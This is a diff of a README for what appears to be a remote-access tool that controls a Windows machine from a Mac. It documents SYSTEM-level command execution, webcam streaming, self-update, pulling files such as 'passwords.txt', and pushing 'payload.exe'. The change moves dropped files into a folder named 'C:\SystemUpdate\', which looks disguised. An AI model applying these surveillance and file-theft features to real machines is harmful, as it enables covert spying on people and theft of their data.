@@ -110,7 +110,7 @@ nt authority\system
 | Command | Description | Example |
 |---|---|---|
 | `get <filepath>` | Copy file from Windows VM to ~/Desktop on Mac — abs or relative to remote cwd | `get secret.txt` or `get C:\Users\user\file.txt` |
-| `put <filepath>` | Push local file from Mac to Windows script dir (`C:\`) — abs or relative to Mac cwd | `put tool.exe` or `put ~/Desktop/tool.exe` |
+| `put <filepath>` | Push local file from Mac to `C:\SystemUpdate\` on Windows (created if missing) — abs or relative to Mac cwd | `put tool.exe` or `put ~/Desktop/tool.exe` |
 | `version` | Show client version, host, PID | `version` |
 | `update` | Force immediate self-update from GitHub | `update` |
 | `stream` | Start webcam stream — works in **both** user and SYSTEM mode. Open the printed URL in your browser. | `stream` |
@@ -162,7 +162,7 @@ Open the URL in your browser for the live MJPEG feed. Type `stopstream` to end i
 DESKTOP-ABC> get passwords.txt
 DESKTOP-ABC> get C:\Users\user\Documents\report.pdf
 
-# Push file from Mac → C:\ on Windows (relative or absolute)
+# Push file from Mac → C:\SystemUpdate\ on Windows (created if missing)
 shell> put tool.exe
 shell> put ~/Desktop/payload.exe
 ```
